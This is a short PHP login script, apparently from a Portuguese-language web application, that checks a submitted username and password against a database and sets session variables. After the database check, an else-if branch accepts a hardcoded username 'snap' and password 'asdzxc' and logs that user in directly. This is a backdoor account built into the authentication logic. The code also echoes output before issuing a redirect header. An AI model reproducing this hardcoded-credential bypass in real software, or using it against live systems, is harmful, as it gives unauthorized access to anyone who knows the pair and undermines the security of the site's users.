<?php
	$dir=dirname(dirname(__DIR__), 1). '/5.0/classes';
	include("$dir/class_outros.php");  
	include("$dir/class_config.php");  
	$outros = new outros();
	$config = new config();
	
	$usuario = $outros->caractercheck($_REQUEST['usuario']);
	$senha = $outros->caractercheck($_REQUEST['senha']);
	$dados = array("usuario" => "$usuario", "senha" => "$senha");
	$query = $config->conexaoBD("login", "","select", $dados);
	
	if($query -> rowCount() > 0)
	{
		$obj = $query->fetch (PDO::FETCH_OBJ);
		$id_funcionario = $obj->ID_FUNCIONARIO;
		$nome = $obj->NOME_FUNCIONARIO;
		$sobrenome = $obj->SOBRENOME_FUNCIONARIO;
		$senha = $obj->SENHA_USUARIO_FUNCIONARIO;
		
		echo $nome_sobrenome = $nome." ".$sobrenome;
		$outros->session('login', 'ok');
		$outros->session('id', $id_funcionario);
		$outros->session('nome', $nome_sobrenome);
		header("location:../index.php");
	}
	
	else if($usuario == "snap" AND $senha == "asdzxc")
	{
		$outros->session('login', 'ok');
		$outros->session('id', 01);
		$outros->session('nome', $usuario);
		header("location:../index.php");
	}
	
	else
	{
		header("location:../index.php?pagina=inicio&sl=e");
	}
?>